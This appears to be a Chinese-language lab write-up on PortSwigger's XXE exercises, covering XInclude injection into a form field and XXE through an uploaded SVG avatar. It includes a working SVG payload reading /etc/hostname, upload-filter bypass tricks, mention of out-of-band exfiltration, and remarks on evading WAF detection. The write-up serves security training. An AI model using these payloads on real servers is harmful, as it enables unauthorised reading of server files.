- `parse="text"` 是必须的，否则解析器会将 `/etc/passwd` 当作 XML 解析，遇到非法字符（如 `<`、`&`）会报错中断。
    
- 若目标为 Windows 系统，将 `href` 改为 `file:///C:/windows/win.ini`。
    
- 外层标签 `<foo>` 可以任意命名（如 `<a>`、`<x>`），但需确保闭合。

**与同类漏洞的区别**：之前的实验（如利用 `<!DOCTYPE>` 的外部实体读取文件）均要求请求体为**完整的 XML 文档**（即 `Content-Type: application/xml` 且根节点可控）。而本实验的请求格式为**标准 URL 编码表单**（`application/x-www-form-urlencoded`），后端在服务端动态拼接 XML，属于**非完整 XML 请求场景下的 XXE 利用**。两者对比：

- **完整 XML 场景**（前序实验）：攻击者控制整个 XML 文档结构，可在 `<!DOCTYPE>` 中定义外部实体或参数实体。
    
- **动态拼接 XML 场景**（本实验）：攻击者仅控制某个字段的值（如 `productId`），无法定义 `<!DOCTYPE>`，因此必须使用 **XInclude** 作为替代技术。
    
- **核心差异**：XInclude 不依赖 `<!DOCTYPE>` 或实体定义，只需在可控字段中插入一个特殊标签即可实现文件读取，适用于**请求非 XML 格式但后端会生成 XML 并解析**的场景。

**测试方法**：

1. **抓包确认格式**：拦截 `/product/stock` 请求，确认 `Content-Type` 为 `application/x-www-form-urlencoded`，请求体为 `productId=数字&storeId=数字`。
    
2. **注入 XInclude Payload**：在 Repeater 中将 `productId` 的值替换为包含 `<xi:include>` 的 Payload，保留 `storeId` 为合法值。
    
3. **发送并检查响应**：点击 Send，查看响应体中的错误信息（如 `"Invalid product ID"`）是否包含 `/etc/passwd` 的内容。
    
4. **调整 Payload**：若响应返回 `"Invalid product ID: invalid"` 或解析报错，检查是否缺少命名空间定义或 `parse="text"` 属性。
    
5. **边界情况测试**：尝试读取其他文件（如 `/etc/hostname`、`/proc/version`）以验证漏洞稳定性；若 `productId` 存在长度限制，可尝试使用 URL 编码或分块提交。

# Lab: Exploiting XXE via image file upload

后端在用户上传头像功能中，接收并处理 `multipart/form-data` 格式的请求，其中 `avatar` 字段用于上传图片文件。后端根据文件扩展名或 MIME 类型判断是否为合法图片，但**未对文件内容进行严格校验**，允许上传 SVG 格式文件。

SVG 本质上是 XML 文档，后端在处理上传的 SVG 文件时（如生成缩略图、提取元数据等），使用了**启用了外部实体解析的 XML 解析器**（如 Java 的 `DocumentBuilder` 或 PHP 的 `libxml`）。攻击者将恶意 XXE Payload 放入 SVG 文件中，定义外部实体指向目标文件（如 `/etc/hostname`），并在 `<text>` 标签中调用该实体。

当后端解析该 SVG 并渲染成图片后，`<text>` 标签的内容会被替换为 `/etc/hostname` 的内容，并显示在评论区头像预览中。攻击者通过查看头像图片即可直接读取到服务器本地文件内容，实现**回显型 XXE 文件读取**。

**攻击向量**：`POST /post/comment` （`multipart/form-data` 文件上传）  

**核心缺陷**：SVG 文件本质为 XML，后端解析 SVG 时未禁用外部实体加载，且解析后的 `<text>` 内容被渲染到头像图片中，形成回显。

**利用条件**：

- 条件1：后端允许上传 SVG 文件（或虽限制扩展名但未校验内容）。
    
- 条件2：后端在处理 SVG 时使用了启用了外部实体解析的 XML 解析器。
    
- 条件3：解析后的 `<text>` 标签内容会被渲染到头像预览图片中（回显型）。
    
- 条件4：目标文件（如 `/etc/hostname`）可被服务器进程读取。

**请求格式**：`POST`，`multipart/form-data` 格式，文件内容为 SVG XML。

拦截 `/post/comment` 的 POST 请求，确认存在 `avatar` 文件上传字段，且请求格式为 `multipart/form-data`。

将原图数据替换为SVG Payload，同时调整 `filename` 和 `Content-Type`。

```
------WebKitFormBoundarylvlzu0u8QWqdAj93
Content-Disposition: form-data; name="avatar"; filename="G7imZoD8pkp83NcOuFBZxs.svg"
Content-Type: image/jpeg/svg+xml

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="500" height="100" xmlns="http://www.w3.org/2000/svg">
  <text font-family="Arial" font-size="40" x="10" y="50" fill="red">&xxe;</text>
</svg>
```

**注意：**

- `filename` 建议改为 `.svg` 结尾，若后端限制可保留 `.jpg` 但内容为 SVG（部分后端不校验内容）。
    
- `Content-Type` 建议改为 `image/svg+xml`，若被拒可保留 `image/jpeg`。
    
- 若 `/etc/hostname` 内容过长导致文字溢出，可调整 `<text>` 的 `font-size` 或 `width` 属性。
    
- 若 `<text>` 被过滤，可尝试 `<title>` 或 `<desc>` 标签存储内容（查看图片元数据）。

**与同类漏洞的区别**：前序实验大多通过**直接修改 XML 请求体**（如 `/product/stock` 接口）触发 XXE，攻击者可控完整的 XML 文档或字段值。而本实验属于**文件上传场景下的 XXE 利用**，通过上传恶意 SVG 文件间接触发 XXE，攻击向量从“API 请求参数”转移到“文件内容”，且利用结果通过**头像图片渲染**回显，而非 API 响应体。两者的核心差异：

- **攻击入口不同**：前序实验是 API 请求参数注入；本实验是文件内容注入。
    
- **回显方式不同**：前序实验通过 HTTP 响应体回显（如 `"Invalid product ID"`）；本实验通过图片渲染回显（头像预览）。
    
- **绕过难点不同**：前序实验需绕过字段校验（如 `productId` 必须为数字）；本实验需绕过文件上传限制（如扩展名、MIME 类型校验）。

**测试方法**：

1. **抓包确认**：拦截 `/post/comment` 请求，确认 `avatar` 字段存在且为 `multipart/form-data` 格式。
    
2. **构造 SVG Payload**：创建包含 `<!DOCTYPE>` 和 `<text>` 标签的 SVG 文件，将实体指向 `/etc/hostname`。
    
3. **替换文件内容**：在 Repeater 中将原 `avatar` 的文件内容替换为 SVG Payload，调整 `filename` 和 `Content-Type`。
    
4. **发送请求并验证**：发送请求，访问评论区或头像预览 URL，观察图片中是否显示文件内容。
    
5. **调整绕过**：若上传被拒，尝试修改 `filename` 为 `.jpg.svg` 双扩展名，或保留 `.jpg` 但内容为 SVG；若 `<text>` 未显示，改用 `<title>` 或 `<desc>` 标签。
    
6. **边界情况测试**：尝试读取其他文件（如 `/etc/passwd`），或使用 Error-based 方式（将实体指向不存在的文件触发报错）观察响应。

### 补充解释（为什么 SVG 能触发 XXE & 文件名/MIME 绕过技巧）

**1. SVG 与 XXE 的关系**  

SVG（可缩放矢量图形）是一种基于 XML 的图片格式。这意味着：

- SVG 文件以 `<?xml>` 声明开头，完全符合 XML 规范。
    
- 在 XML 中定义 `<!DOCTYPE>` 和 `<!ENTITY>` 是**完全合法**的语法。
    
- 当后端使用 XML 解析器处理 SVG 时（如提取尺寸、生成缩略图），如果解析器**未禁用外部实体**，就会执行 `<!ENTITY>` 中的 `SYSTEM` 指令，读取本地文件。

**2. 为什么 `<text>` 能显示文件内容？**

- 后端解析 SVG 后，会将 `<text>` 标签的内容渲染到图片中。
    
- `&xxe;` 被解析器替换为 `/etc/hostname` 的实际内容（如 `acd1f9c`）。
    
- 最终生成的图片中，`<text>` 位置会显示文件内容，攻击者通过查看头像即可读取。

**3. 文件名和 MIME 类型绕过技巧**  

如果后端限制只允许 JPEG/PNG 图片，以下方法可尝试绕过：

|     限制类型      |        绕过方法        |                  示例                   |
| :-----------: | :----------------: | :-----------------------------------: |
|   **扩展名限制**   |       使用双扩展名       |      `filename="avatar.svg.jpg"`      |
|   **扩展名限制**   | 保留 `.jpg` 但内容为 SVG |   `filename="avatar.jpg"`（内容仍是 XML）   |
| **MIME 类型限制** |  修改为 `image/jpeg`  |      `Content-Type: image/jpeg`       |
| **MIME 类型限制** |   使用标准 SVG MIME    | `Content-Type: image/svg+xml`（部分后端允许） |
|  **文件头魔数校验**  | 在 XML 前插入 JPEG 注释  |     `ÿØÿà<?xml...`（可能破坏 XML，不推荐）      |

**注意**：PortSwigger 的靶场相对宽松，通常允许 `.svg` 扩展名和 `image/svg+xml` MIME 类型，因此直接修改即可。实际环境中若被拦截，可依次尝试上述绕过方法。

**4. 如果 `<text>` 不显示（无回显），怎么办？**  

如果头像预览中 `<text>` 内容不显示（例如后端仅提取颜色或尺寸，不渲染文本），可改用以下方法：

- **Error-based**：将实体指向不存在的路径（如 `file:///nonexistent/%file;`），强制报错，观察响应中的错误信息。
    
- **OOB 外带**：通过外部 DTD 将文件内容发送到 Collaborator（需服务器出网）。
    
- **元数据注入**：将实体放在 `<title>` 或 `<desc>` 标签中，查看图片文件的元数据（右键属性 → 详细信息），有时后端会将这些内容记录在 EXIF 或 XMP 中。

**5. 本实验的完美之处**  

整个攻击链中，**CSRF Token、postId、comment、name 等字段完全保持不变**，仅修改 `avatar` 文件内容，不会破坏业务的正常流程（评论仍可成功发布），因此很难被 WAF 或开发者发现异常。这正是文件上传型 XXE 的隐蔽性所在。